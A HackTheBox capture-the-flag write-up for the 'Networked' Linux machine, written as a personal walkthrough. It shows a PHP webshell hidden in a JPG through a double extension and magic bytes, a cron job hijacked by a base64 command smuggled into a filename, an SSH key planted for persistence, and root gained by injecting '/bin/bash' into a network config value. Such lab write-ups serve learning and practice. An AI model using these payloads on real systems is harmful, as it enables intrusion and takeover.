---
layout: default
title: "Networked"
date: 26-08-19
---

## Networked - HackTheBox
 
**OS:** Linux  
**Difficulty:** Easy  
**Pawn Date:** 19/08/26  
 
---
 
## Recognition
 
### nmap
```
nmap -sVC -p- IP
```
**Ports found:** 22 (SSH), 80 (HTTP)
 
---
 
## Enumeration
 
Only two open ports — SSH and Apache. The webpage shows a message about building a site called FaceMash, nothing so useful there. i ran gobuster to find hidden files and directories:
 
```
/index.php   200
/upload.php  200
/uploads     301
/photos.php  200
/lib.php     200
/backup      301
```
 
The `/backup` directory contained a `.tar` archive with the PHP source code of the entire application. After reading the source carefully, I understood how the upload validation works:
 
- Checks file size (must be under limit)
- Checks MIME type (must be an image)
- Checks extension (only `.gif`, `.jpg`, `.png` allowed)
- Renames the uploaded file using the client IP address
The key finding: the server checks extension but **not content properly**, making it vulnerable to a **double extension bypass** combined with magic bytes injection.
 
---
 
## Initial Access
 
**Vulnerability:** Unrestricted File Upload → Remote Code Execution  
**Vector:** `/upload.php` exposed on the server
 
To bypass the filters, I embedded a PHP webshell inside a valid JPG file using magic bytes:
 
```bash
echo '\xFF\xD8\xFF\xE0' > shell.php.jpg
echo "<?php system(\$_GET['cmd']); ?>" >> shell.php.jpg
```
 
After uploading and accessing the file via `/uploads/`, I had command execution as the `apache` user.
 
---
 
## Privilege Escalation
 
### apache → guly (Cron Injection)
 
After basic enumeration, I found an interesting cron running every 3 minutes as `guly`:
 
```
*/3 * * * * php /home/guly/check_attack.php
```
 
Reading `check_attack.php`, I noticed this vulnerable line:
 
```php
mail($to, $msg, $msg, $headers, "-F$value");
```
 
The variable `$value` is the **filename** of files in `/var/www/html/uploads/`, and it's passed directly to `mail()` without sanitization. This means if a filename contains `;command;`, the shell will execute that command as `guly` when the cron runs.
 
Since I couldn't use `/` in filenames (kernel restriction), I encoded the command in base64:
 
```bash
# Command to encode:
# cat /home/guly/user.txt > /var/www/html/uploads/XDLOL
 
curl -G --data-urlencode 'cmd=touch -- ";echo BASE64HERE | base64 -d | bash;"' \
  http://IP/uploads/10_10_17_100.php.jpg | strings
```
 
After waiting 3 minutes for the cron to execute, I had the user flag and confirmed execution as `guly`.
 
To get a proper shell, I added my SSH public key to `guly`'s `authorized_keys` using the same cron injection technique, then connected via SSH.
 
---
 
### guly → root (Network Script Injection)
 
```bash
sudo -l
# User guly may run: (root) NOPASSWD: /usr/local/sbin/changename.sh
```
 
The script `changename.sh` creates a network interface configuration and runs `ifup`. On CentOS/RHEL, network configuration scripts are vulnerable to command injection via spaces in the values.
 
```bash
sudo /usr/local/sbin/changename.sh
interface NAME: aaa /bin/bash
interface PROXY_METHOD: aaa
interface BROWSER_ONLY: aaa
interface BOOTPROTO: aaa
```
 
The space in `aaa /bin/bash` caused the system to execute `/bin/bash` as root, giving a root shell.
 
---
 
## Lessons Learned
 
- Double extension bypass works when servers check extension but not MIME type properly
- Filenames passed to shell commands without sanitization = command injection vector
- When `/` is not available in filenames, base64 encoding is a reliable bypass
- Always read source code carefully when it's available — it reveals the exact validation logic
- Always run `sudo -l` first when escalating privileges
- Network config scripts on CentOS/RHEL are vulnerable to injection via spaces in values
- GTFOBins is essential when you find a binary in `sudo -l`
